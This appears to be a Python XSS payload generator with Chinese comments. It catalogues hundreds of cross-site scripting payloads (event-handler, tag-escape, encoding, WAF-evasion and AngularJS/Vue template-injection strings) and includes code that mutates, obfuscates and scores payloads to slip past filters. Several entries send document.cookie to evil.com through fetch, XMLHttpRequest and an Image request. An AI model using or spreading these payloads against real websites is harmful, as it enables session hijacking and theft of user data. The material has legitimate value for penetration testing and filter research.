import html
import base64
import urllib.parse

class XSSPayloadGenerator:
    def __init__(self):
        # 基础Payload
        self.base_payloads = {
            "Alert": "<script>alert(1)</script>",
            "Prompt": "<script>prompt(1)</script>",
            "Confirm": "<script>confirm(1)</script>",
            "弹Cookie": "<script>alert(document.cookie)</script>",
            "弹当前域名": "<script>alert(document.domain)</script>",
            "弹当前URL": "<script>alert(location.href)</script>",
            "控制台打印": "<script>console.log('XSS')</script>",
            "控制台打印Cookie": "<script>console.log(document.cookie)</script>",
        }

        # 无交互自动触发
        self.auto_trigger = {
            "img-onerror": "<img src=x onerror=alert(1)>",
            "svg-onload": "<svg onload=alert(1)>",
            "svg-onload-无空格": "<svg/onload=alert(1)>",
            "body-onload": "<body onload=alert(1)>",
            "iframe-onload": "<iframe onload=alert(1)>",
            "iframe-srcdoc": "<iframe srcdoc='<script>alert(1)</script>'>",
            "video-onerror": "<video><source onerror=alert(1)>",
            "audio-onerror": "<audio src=x onerror=alert(1)>",
            "input-autofocus": "<input onfocus=alert(1) autofocus>",
            "textarea-autofocus": "<textarea onfocus=alert(1) autofocus>",
            "select-autofocus": "<select onfocus=alert(1) autofocus></select>",
            "button-autofocus": "<button onfocus=alert(1) autofocus>",
            "details-open": "<details open ontoggle=alert(1)>",
            "object-data": "<object data='javascript:alert(1)'>",
            "object-onerror": "<object data=x onerror=alert(1)>",
            "embed-onerror": "<embed src=x onerror=alert(1)>",
            "link-onerror": "<link rel=stylesheet href=x onerror=alert(1)>",
            "form-onformdata": "<form onformdata=alert(1)><button>",
            "body-onpageshow": "<body onpageshow=alert(1)>",
            "body-onhashchange": "<body onhashchange=alert(1)>",
            "video-onloadstart": "<video onloadstart=alert(1) src=x>",
            "audio-oncanplay": "<audio oncanplay=alert(1) src=x>",
            "style-onload": "<style onload=alert(1)>",
            "link-onload": "<link rel=stylesheet onload=alert(1)>",
        }

        # 需交互触发
        self.interactive = {
            "img-onmouseover": "<img src=x onmouseover=alert(1)>",
            "a-href": "<a href=javascript:alert(1)>click</a>",
            "button-onclick": "<button onclick=alert(1)>click</button>",
            "input-onclick": "<input type=button onclick=alert(1) value=click>",
            "div-onclick": "<div onclick=alert(1)>click</div>",
            "a-onmouseover": "<a onmouseover=alert(1)>hover</a>",
            "div-ondblclick": "<div ondblclick=alert(1)>double click</div>",
            "input-onchange": "<input onchange=alert(1)>",
            "select-onchange": "<select onchange=alert(1)><option>",
            "textarea-oninput": "<textarea oninput=alert(1)>",
            "form-onsubmit": "<form onsubmit=alert(1)><button>",
            "input-accesskey": "<input accesskey=x onclick=alert(1)> [Alt+X]",
            "span-draggable": "<span draggable=true ondragstart=alert(1)>drag</span>",
            "div-contextmenu": "<div oncontextmenu=alert(1)>right click</div>",
            "details-ontoggle": "<details ontoggle=alert(1)>click</details>",
            "details-open": "<details open ontoggle=alert(1)>",
            "body-onscroll": "<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>",
            "form-onreset": "<form onreset=alert(1)><input type=reset></form>",
            "svg-onmousewheel": "<svg onmousewheel=alert(1)>scroll</svg>",
        }

        # JavaScript上下文
        self.js_context = {
            "字符串逃逸-单引号": "';alert(1)//",
            "字符串逃逸-双引号": "\";alert(1)//",
            "模板字符串": "`${alert(1)}`",
            "注释逃逸": "*/alert(1)//",
            "eval注入": "alert(1)",
            "换行逃逸": "\nalert(1)//",
            "多行注释": "/**/alert(1)//",
        }

        # 属性逃逸
        self.attr_escape = {
            "属性逃逸-双引号": "\"><img src=x onerror=alert(1)>",
            "属性逃逸-单引号": "'><img src=x onerror=alert(1)>",
            "属性逃逸-反引号": "`><img src=x onerror=alert(1)>",
            "闭合标签": "</script><script>alert(1)</script>",
            "textarea逃逸": "</textarea><script>alert(1)</script>",
            "title逃逸": "</title><script>alert(1)</script>",
            "noscript逃逸": "</noscript><script>alert(1)</script>",
            "style逃逸": "</style><script>alert(1)</script>",
            "noembed逃逸": "</noembed><script>alert(1)</script>",
            "xmp逃逸": "</xmp><script>alert(1)</script>",
            "template逃逸": "</template><script>alert(1)</script>",
            "title优先级": "<title><img src=</title>><img src=x onerror=alert(1)>",
            "textarea优先级": "<textarea><img x=</textarea>><img src=x onerror=alert(1)>",
            "xmp优先级": "<xmp><img x=</xmp>><img src=x onerror=alert(1)>",
            "style优先级": "<style><img src=</style>><img src=x onerror=alert(1)>",
            "noscript优先级": "<noscript><img x=</noscript>><img src=x onerror=alert(1)>",
        }

        # 编码绕过
        self.encoding_bypass = {
            "HTML实体-十进制": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            "HTML实体-十六进制": "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
            "HTML实体-属性": "<input onfocus=&#97;&#108;&#101;&#114;&#116;(1)>",
            "HTML命名实体-混合": "<input onfocus=&#97;&#108;&#101;&#114;&#116;&lpar;&apos;&#104;&#105;&apos;&rpar;&semi;>",
            "HTML命名实体-括号": "<input onfocus=\"alert&lpar;2&rpar;\">",
            "URL编码": "<a href=javascript:%61%6c%65%72%74(1)>click</a>",
            "反引号调用": "<img src=x onerror=alert`1`>",
            "data-base64": "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
            "data-url编码": "<iframe src='data:text/html,%3Cscript%3Ealert(1)%3C/script%3E'>",
            "eval-unescape": "<input onfocus=eval(unescape('%61%6c%65%72%74%28%31%29'))>",
            "eval-atob": "<input onfocus=eval(atob('YWxlcnQoMSk='))>",
            "Unicode编码": "<input onfocus=eval('\\u0061\\u006c\\u0065\\u0072\\u0074(1)')>",
            "Hex编码": "<input onfocus=eval('\\x61\\x6c\\x65\\x72\\x74(1)')>",
        }

        # 数组/函数绕过
        self.function_bypass = {
            "String.fromCharCode": "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            "无括号throw": "<script>onerror=alert;throw 1</script>",
            "constructor": "<img src=x onerror=this.constructor.constructor('alert(1)')()>",
            "字符串拼接-变量": "<input onfocus=\"a='ale';b='rt';c='(1)';eval(a+b+c)\">",
            "字符串拼接-方括号": "<input onfocus=window[\"ev\"+\"al\"](\"ale\"+\"rt(1)\")>",
            "字符串拼接-document": "<input onfocus=window[\"al\"+\"ert\"](document[\"co\"+\"okie\"])>",
            "假注释绕过": "<input onfocus=\"a='//';alert(1)\">",
            "颜文字-onmousemove": "<x onmousemove=啊='',你=!啊+啊,好=!你+啊,啊啊=啊+{},啊你=你[啊++],啊好=你[你啊=啊],你你=++你啊+啊,你好=啊啊[你啊+你你],你[你好+=啊啊[啊]+(你.好+啊啊)[啊]+好[你你]+啊你+啊好+你[你啊]+你好+啊你+啊啊[啊]+啊好][你好](好[啊]+好[你啊]+你[你你]+啊好+啊你+\"(啊)\")()>text",
            "颜文字-onclick": "<x onclick=嗯='',吗=!嗯+嗯,呢=!吗+嗯,嗯嗯=嗯+{},嗯吗=吗[嗯++],嗯呢=吗[吗嗯=嗯],吗吗=++吗嗯+嗯,吗呢=嗯嗯[吗嗯+吗吗],吗[吗呢+=嗯嗯[嗯]+(吗.呢+嗯嗯)[嗯]+呢[吗吗]+嗯吗+嗯呢+吗[吗嗯]+吗呢+嗯吗+嗯嗯[嗯]+嗯呢][吗呢](呢[嗯]+呢[吗嗯]+吗[吗吗]+嗯呢+嗯吗+\"(嗯)\")()>点我",
            "颜文字-onerror": "<img src=x onerror=哦='',呀=!哦+哦,啦=!呀+哦,哦哦=哦+{},哦呀=呀[哦++],哦啦=呀[呀哦=哦],呀呀=++呀哦+哦,呀啦=哦哦[呀哦+呀呀],呀[呀啦+=哦哦[哦]+(呀.啦+哦哦)[哦]+啦[呀呀]+哦呀+哦啦+呀[呀哦]+呀啦+哦呀+哦哦[哦]+哦啦][呀啦](啦[哦]+啦[呀哦]+呀[呀呀]+哦啦+哦呀+\"(哦)\")()>",
            "颜文字-svg": "<svg onload=嘿='',哈=!嘿+嘿,哼=!哈+嘿,嘿嘿=嘿+{},嘿哈=哈[嘿++],嘿哼=哈[哈嘿=嘿],哈哈=++哈嘿+嘿,哈哼=嘿嘿[哈嘿+哈哈],哈[哈哼+=嘿嘿[嘿]+(哈.哼+嘿嘿)[嘿]+哼[哈哈]+嘿哈+嘿哼+哈[哈嘿]+哈哼+嘿哈+嘿嘿[嘿]+嘿哼][哈哼](哼[嘿]+哼[哈嘿]+哈[哈哈]+嘿哼+嘿哈+\"(嘿)\")()>",
        }

        # WAF绕过技巧
        self.waf_bypass = {
            "斜杠分隔": "<img/src=\"x\"/onerror=alert(1)>",
            "多斜杠": "<img/src/onerror=alert(1)>",
            "换行符": "<img\nsrc=x\nonerror=alert(1)>",
            "Tab符": "<img\tsrc=x\tonerror=alert(1)>",
            "回车符": "<img\rsrc=x\ronerror=alert(1)>",
            "空格混淆": "<img src=x onerror =alert(1)>",
            "换行注释": "<img src=x onerror=\"/*\n*/alert(1)\">",
            "大小写混淆": "<ImG sRc=x OnErRoR=alert(1)>",
            "假闭合": "<iframe x=\">\" src=javascript:alert(1)>",
            "多尖括号": "<<script>alert(1)</script>",
            "杂属性绕过": "<script ttt=aaa bbb=ccc>alert(1)</script>",
            "等号空白符": "<input onfocus\t=\n\"alert(1)\">",
            "空格-斜杠": "<input/onfocus=alert(1)>",
            "空格-注释": "<input/**/onfocus=alert(1)>",
            "空格-属性": "<input/type='text'onfocus=alert(1)>",
            "无引号": "<input type=text onfocus=alert(1)>",
            "反引号": "<input onfocus=alert(`xss`)>",
            "点-方括号": "<input onfocus=alert(document['cookie'])>",
        }

        # SVG特殊
        self.svg_tricks = {
            "svg-script": "<svg><script>alert(1)</script></svg>",
            "svg-animate": "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>",
            "svg-set": "<svg><set onbegin=alert(1) attributeName=x to=1></svg>",
            "svg-foreignObject": "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>",
            "svg-use": "<svg><use href=data:image/svg+xml,<svg id=x><script>alert(1)</script></svg>#x>",
            "svg-image": "<svg><image href=x onerror=alert(1)>",
            "svg-onload": "<svg onload=alert(1)>",
        }

        # 框架特定
        self.framework = {
            "AngularJS-1.x": "{{constructor.constructor('alert(1)')()}}",
            "AngularJS-沙箱": "{{$on.constructor('alert(1)')()}}",
            "VueJS-2.x": "{{_c.constructor('alert(1)')()}}",
            "VueJS-3.x": "{{_openBlock.constructor('alert(1)')()}}",
            "React-dangerouslySetInnerHTML": "<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}>",
        }

        # 短payload（长度限制）
        self.short_payloads = {
            "最短-21字符": "<svg/onload=alert(1)>",
            "反引号-21字符": "<svg/onload=alert`1`>",
            "location跳转": "<svg onload=location='javascript:alert\\x281\\x29'>",
            "import导入": "<script>import('data:text/javascript,alert(1)')</script>",
        }

        # 严格绕过（不使用 < > alert）
        self.strict_bypass = {
            "confirm函数": "javascript:confirm(1)",
            "prompt函数": "javascript:prompt(1)",
            "throw语句": "javascript:throw 1",
            "console.log": "console.log(document.cookie)",
            "console.error": "console.error(document.domain)",
            "String.fromCharCode": "eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))",
            "Function构造": "Function('confirm(1)')()",
            "setTimeout字符串": "setTimeout('confirm(1)',0)",
            "setInterval字符串": "setInterval('confirm(1)',1000)",
            "location.href赋值": "location.href='javascript:confirm(1)'",
            "location='javascript'": "location='javascript:confirm(1)'",
            "location.assign": "location.assign('javascript:confirm(1)')",
            "location.replace": "location.replace('javascript:confirm(1)')",
            "top.location": "top.location='javascript:confirm(1)'",
            "self.location": "self.location='javascript:confirm(1)'",
            "parent.location": "parent.location='javascript:confirm(1)'",
            "window.open": "window.open('javascript:confirm(1)')",
            "fetch请求": "fetch('//evil.com?c='+document.cookie)",
            "XMLHttpRequest": "new XMLHttpRequest().open('GET','//evil.com?c='+document.cookie)",
            "Image发送": "new Image().src='//evil.com?c='+document.cookie",
            "eval-atob": "eval(atob('Y29uZmlybSgxKQ=='))",
            "with语句": "with(document)body.innerHTML=cookie",
            "onerror赋值": "onerror=confirm;throw 1",
            "onhashchange": "onhashchange=confirm;location.hash=1",
        }

        # 合并所有
        self.all_payloads = {
            **self.base_payloads, **self.auto_trigger, **self.interactive,
            **self.js_context, **self.attr_escape, **self.encoding_bypass,
            **self.function_bypass, **self.waf_bypass, **self.svg_tricks,
            **self.framework, **self.short_payloads, **self.strict_bypass
        }

    def generate(self, payload_type, bypass_options):
        payload = self.all_payloads.get(payload_type, self.base_payloads["Alert"])
        for option in bypass_options:
            payload = self._apply_bypass(payload, option)
        return payload

    def _apply_bypass(self, payload, method):
        methods = {
            "大小写混淆": self._case_obfuscate,
            "双写绕过": self._double_write,
            "HTML实体编码": self._html_entity_encode,
            "HTML命名实体": self._named_entity_encode,
            "URL编码全部": self._url_encode_all,
            "注释插入": self._insert_comments,
            "换行符": lambda p: p.replace(' ', '\n'),
            "Tab符": lambda p: p.replace(' ', '\t'),
            "斜杠分隔": lambda p: p.replace(' ', '/'),
            "反引号替换": self._backtick_replace,
            "无引号": self._remove_quotes,
            "字符串拼接": self._string_concat,
            "fromCharCode": self._use_fromcharcode,
        }
        return methods.get(method, lambda p: p)(payload)

    def _case_obfuscate(self, payload):
        """大小写混淆 - 只混淆HTML标签和属性名，不混淆JavaScript代码"""
        import re

        def mix_case(text):
            return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(text))

        # 替换标签名: <img> → <iMg>
        result = re.sub(r'<(/?)(\w+)', lambda m: '<' + m.group(1) + mix_case(m.group(2)), payload)

        # 替换事件属性名: onload= → OnLoAd=
        result = re.sub(r'\b(on\w+)(?==)', lambda m: mix_case(m.group(1)), result)

        # 替换常见属性名: src= → sRc=
        for attr in ['src', 'href', 'data', 'type', 'value', 'style', 'class', 'id']:
            result = re.sub(r'\b' + attr + r'(?==)', lambda m: mix_case(m.group(0)), result, flags=re.IGNORECASE)

        return result

    def _double_write(self, payload):
        """双写绕过：优先双写事件属性，其次是标签名"""
        import re
        # 优先级：事件属性 > 标签名（事件属性更容易被过滤）
        keywords = ["onerror", "onload", "onclick", "onmouseover", "onfocus", "onmouseenter",
                   "script", "iframe", "object", "embed", "svg", "img"]

        for kw in keywords:
            # 大小写不敏感搜索
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            match = pattern.search(payload)

            if match:
                # 获取实际匹配到的文本（保留原始大小写）
                actual_text = match.group(0)
                mid = len(actual_text) // 2
                # 在中间插入完整关键词
                doubled = actual_text[:mid] + actual_text + actual_text[mid:]
                # 只替换第一个匹配
                payload = payload[:match.start()] + doubled + payload[match.end():]
                # 只双写一个关键词就够了
                break

        return payload

    def _html_entity_encode(self, payload):
        """HTML实体编码关键函数名"""
        import re
        # 优先编码事件处理器中的JavaScript代码
        # 匹配 on事件="代码" 或 on事件=代码
        def encode_js(match):
            event = match.group(1)
            quote = match.group(2) if match.group(2) else ''
            code = match.group(3)
            # 编码JavaScript代码
            encoded = ''.join([f'&#{ord(c)};' for c in code])
            return f'{event}={quote}{encoded}{quote}'

        # 匹配事件处理器
        result = re.sub(r'(on\w+)=([\"\']?)([^\"\'>\s]+)', encode_js, payload, flags=re.IGNORECASE)

        # 如果没有事件处理器，编码常见关键词
        if result == payload:
            result = re.sub(r'alert', '&#97;&#108;&#101;&#114;&#116;', payload, flags=re.IGNORECASE)
            result = re.sub(r'script', '&#115;&#99;&#114;&#105;&#112;&#116;', result, flags=re.IGNORECASE)
            result = re.sub(r'eval', '&#101;&#118;&#97;&#108;', result, flags=re.IGNORECASE)

        return result

    def _named_entity_encode(self, payload):
        """HTML命名实体编码：把事件处理器代码中的特殊符号替换为命名实体
        如 ( → &lpar;  ) → &rpar;  ' → &apos;  ; → &semi;
        注意：仅在HTML属性上下文有效，<script> 内不会被浏览器解析。"""
        import re
        named = {
            '(': '&lpar;', ')': '&rpar;', "'": '&apos;', '"': '&quot;',
            ';': '&semi;', ',': '&comma;', '.': '&period;', '`': '&grave;',
            '+': '&plus;', '!': '&excl;',
        }

        def encode_code(match):
            event = match.group(1)
            quote = match.group(2) if match.group(2) else ''
            code = match.group(3)
            encoded = ''.join(named.get(c, c) for c in code)
            return f'{event}={quote}{encoded}{quote}'

        # 匹配事件处理器（与 _html_entity_encode 保持一致的写法）
        result = re.sub(r'(on\w+)=([\"\']?)([^\"\'>\s]+)', encode_code, payload, flags=re.IGNORECASE)
        return result

    def _url_encode_all(self, payload):
        """URL编码（只编码javascript:协议后的代码部分）"""
        import re
        # 匹配javascript:xxx> 或 javascript:xxx"等结束符
        pattern = r'javascript:([^"\'>]+)'

        def encode_js(match):
            code = match.group(1)
            encoded = urllib.parse.quote(code)
            return f'javascript:{encoded}'

        result = re.sub(pattern, encode_js, payload, flags=re.IGNORECASE)
        return result

    def _insert_comments(self, payload):
        """在关键位置插入注释"""
        # 跳过包含accesskey等特殊属性的payload
        if 'accesskey' in payload.lower() or '[alt+' in payload.lower():
            return payload

        # 在等号和属性值之间插入
        result = payload.replace('=', '/**/=/**/')
        # 在函数调用的括号前插入
        result = result.replace('(', '/**/(')
        return result

    def _remove_quotes(self, payload):
        return payload.replace('"', '').replace("'", '')

    def _backtick_replace(self, payload):
        """反引号替换括号：alert(1) → alert`1`"""
        import re
        # 只替换简单的单参数函数调用
        result = re.sub(r'(\w+)\((\d+)\)', r'\1`\2`', payload)
        return result

    def _string_concat(self, payload):
        """通用字符串拼接 - 支持任意函数"""
        import re

        # 匹配函数调用: function(...)
        func_pattern = r'\b([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\('

        def replace_func(match):
            func_name = match.group(1)
            # 跳过已经是window[]形式的
            if 'window[' in payload[:match.start()]:
                return match.group(0)
            # 将函数名拆分为两部分
            if len(func_name) >= 2:
                mid = len(func_name) // 2
                part1 = func_name[:mid]
                part2 = func_name[mid:]
                return f"window['{part1}'+'{part2}']("
            return match.group(0)

        result = re.sub(func_pattern, replace_func, payload)
        return result

    def _use_fromcharcode(self, payload):
        if 'alert(1)' in payload:
            # alert(1) -> String.fromCharCode(97,108,101,114,116,40,49,41)
            return payload.replace('alert(1)', 'eval(String.fromCharCode(97,108,101,114,116,40,49,41))')
        return payload

    def batch_generate(self, payload_type, all_bypass_options):
        variants = []
        base = self.all_payloads.get(payload_type, self.base_payloads["Alert"])
        variants.append(("原始", base))

        for option in all_bypass_options:
            result = self._apply_bypass(base, option)
            variants.append((option, result))

        # 组合绕过
        combined = base
        for option in all_bypass_options[:3]:
            combined = self._apply_bypass(combined, option)
        if len(all_bypass_options) > 1:
            variants.append(("组合绕过", combined))

        return variants

    def get_categories(self):
        return {
            "基础": list(self.base_payloads.keys()),
            "无交互触发": list(self.auto_trigger.keys()),
            "需交互触发": list(self.interactive.keys()),
            "JS上下文": list(self.js_context.keys()),
            "属性逃逸": list(self.attr_escape.keys()),
            "编码绕过": list(self.encoding_bypass.keys()),
            "函数绕过": list(self.function_bypass.keys()),
            "WAF绕过": list(self.waf_bypass.keys()),
            "SVG技巧": list(self.svg_tricks.keys()),
            "框架特定": list(self.framework.keys()),
            "长度限制": list(self.short_payloads.keys()),
            "严格绕过": list(self.strict_bypass.keys()),
        }

    def suggest_bypass(self, context):
        """根据上下文智能推荐绕过策略"""
        suggestions = {
            "HTML标签内": ["大小写混淆", "注释插入", "双写绕过"],
            "HTML属性": ["HTML实体编码", "HTML命名实体", "URL编码全部", "反引号替换"],
            "JavaScript": ["字符串拼接", "fromCharCode", "反引号替换"],
            "严格WAF": ["斜杠分隔", "换行符", "Tab符"],
        }
        return suggestions.get(context, ["大小写混淆", "双写绕过"])

    def mutate_payload(self, payload):
        """Payload变异器 - 生成多个变种"""
        mutations = []

        # 变异1: 空格变换
        mutations.append(("空格→斜杠", payload.replace(' ', '/')))
        mutations.append(("空格→换行", payload.replace(' ', '\n')))
        mutations.append(("空格→Tab", payload.replace(' ', '\t')))

        # 变异2: 引号变换
        if '"' in payload or "'" in payload:
            mutations.append(("引号→反引号", payload.replace('"', '`').replace("'", '`')))
            mutations.append(("移除引号", payload.replace('"', '').replace("'", '')))

        # 变异3: 标签混淆
        if '<' in payload and '>' in payload:
            mutations.append(("添加注释", payload.replace('<', '</**/').replace('>', '/**/>').replace('=', '/**/=')))
            mutations.append(("大小写混淆", self._case_obfuscate(payload)))

        # 变异4: 关键词编码
        if 'alert' in payload.lower():
            # HTML实体编码alert
            encoded = payload.replace('alert', '&#97;&#108;&#101;&#114;&#116;')
            mutations.append(("alert编码", encoded))

            # 使用eval+fromCharCode
            char_codes = ','.join(str(ord(c)) for c in 'alert')
            mutated = payload.replace('alert', f'eval(String.fromCharCode({char_codes}))')
            mutations.append(("fromCharCode", mutated))

        # 变异5: 属性名混淆
        if 'onerror' in payload:
            mutations.append(("onerror大小写", payload.replace('onerror', 'OnErRoR')))
        if 'onload' in payload:
            mutations.append(("onload大小写", payload.replace('onload', 'OnLoAd')))

        # 变异6: 标签变换
        if '<img' in payload:
            mutations.append(("img→svg", payload.replace('<img', '<svg').replace('onerror', 'onload')))
        if '<script>' in payload:
            mutations.append(("script→svg", payload.replace('<script>', '<svg><script>').replace('</script>', '</script></svg>')))

        # 去重
        seen = {payload}
        unique_mutations = []
        for name, mutated in mutations:
            if mutated != payload and mutated not in seen:
                seen.add(mutated)
                unique_mutations.append((name, mutated))

        return unique_mutations

    def customize_payload(self, payload, custom_code):
        """自定义替换payload中的执行代码"""
        replacements = [
            ('alert(1)', custom_code),
            ('alert(document.cookie)', custom_code),
            ('alert(document.domain)', custom_code),
            ('alert(location.href)', custom_code),
            ('prompt(1)', custom_code),
            ('confirm(1)', custom_code),
            ("console.log('XSS')", custom_code),
            ('console.log(document.cookie)', custom_code),
        ]

        result = payload
        for old, new in replacements:
            if old in result:
                result = result.replace(old, new)
                break

        return result

    def validate_payload(self, payload):
        """Payload验证器 - 检查语法和有效性"""
        issues = []
        warnings = []
        suggestions = []

        # 1. 基础语法检查
        if '<' in payload and '>' not in payload:
            issues.append("❌ 标签未闭合：缺少 >")

        if '>' in payload and '<' not in payload:
            issues.append("❌ 语法错误：有 > 但缺少 <")

        # 2. JavaScript语法检查
        if 'alert(' in payload and ')' not in payload:
            issues.append("❌ 函数调用未闭合：alert( 缺少 )")

        if 'prompt(' in payload and ')' not in payload:
            issues.append("❌ 函数调用未闭合：prompt( 缺少 )")

        # 3. 引号配对检查
        single_quotes = payload.count("'")
        double_quotes = payload.count('"')
        if single_quotes % 2 != 0:
            warnings.append("⚠️ 单引号数量为奇数，可能未配对")
        if double_quotes % 2 != 0:
            warnings.append("⚠️ 双引号数量为奇数，可能未配对")

        # 4. 标签有效性检查
        invalid_tags = []
        if '<scirpt>' in payload.lower():
            invalid_tags.append('scirpt (应为 script)')
        if '<svg' in payload and 'onload=' not in payload and 'onclick=' not in payload:
            warnings.append("⚠️ SVG标签没有事件处理器，可能不会触发")
        if '<img' in payload and 'onerror=' not in payload and 'onload=' not in payload:
            warnings.append("⚠️ img标签没有onerror/onload，可能不会触发")

        if invalid_tags:
            issues.append(f"❌ 标签名拼写错误: {', '.join(invalid_tags)}")

        # 5. 常见错误检查
        if 'onerror=alert' in payload and '(' not in payload.split('onerror=')[1][:20]:
            warnings.append("⚠️ onerror=alert 后面可能缺少括号")

        if payload.startswith(' ') or payload.endswith(' '):
            warnings.append("⚠️ payload首尾有空格，可能影响注入")

        # 6. 编码问题检查
        if '\\x' in payload or '\\u' in payload:
            warnings.append("⚠️ 包含转义序列，确认在正确的上下文中使用")

        if '%' in payload and not all(c in '0123456789ABCDEFabcdef' for c in payload.split('%')[1][:2] if payload.split('%')[1]):
            warnings.append("⚠️ URL编码格式可能不正确")

        # 7. 浏览器兼容性检查
        if 'fetch(' in payload:
            suggestions.append("💡 fetch()在IE中不支持，考虑使用XMLHttpRequest或Image")

        if 'import(' in payload:
            suggestions.append("💡 import()需要现代浏览器支持")

        if '`' in payload:
            suggestions.append("💡 反引号（模板字符串）在旧浏览器中不支持")

        # 8. 执行可能性评估
        auto_trigger = False
        if any(x in payload for x in ['onload=', 'onerror=', 'autofocus', 'open ', 'onfocus=']):
            auto_trigger = True

        if not auto_trigger and any(x in payload for x in ['onclick=', 'onmouseover=', 'onmouseout=']):
            suggestions.append("💡 需要用户交互才能触发")

        # 9. WAF检测提示
        dangerous_keywords = ['script', 'alert', 'onerror', 'eval', 'document', 'cookie']
        detected = [k for k in dangerous_keywords if k.lower() in payload.lower()]
        if len(detected) >= 3:
            suggestions.append(f"💡 包含多个敏感词({', '.join(detected)})，可能被WAF拦截，建议使用编码绕过")

        # 10. 长度评估
        if len(payload) > 200:
            suggestions.append("💡 payload较长(>200字符)，注意长度限制")
        elif len(payload) < 30:
            suggestions.append("💡 payload很短，适合长度限制场景")

        # 11. 计算有效性评分
        score = 100
        score -= len(issues) * 30  # 每个错误扣30分
        score -= len(warnings) * 10  # 每个警告扣10分
        score = max(0, score)

        return {
            "valid": len(issues) == 0,
            "score": score,
            "issues": issues,
            "warnings": warnings,
            "suggestions": suggestions,
            "auto_trigger": auto_trigger,
        }
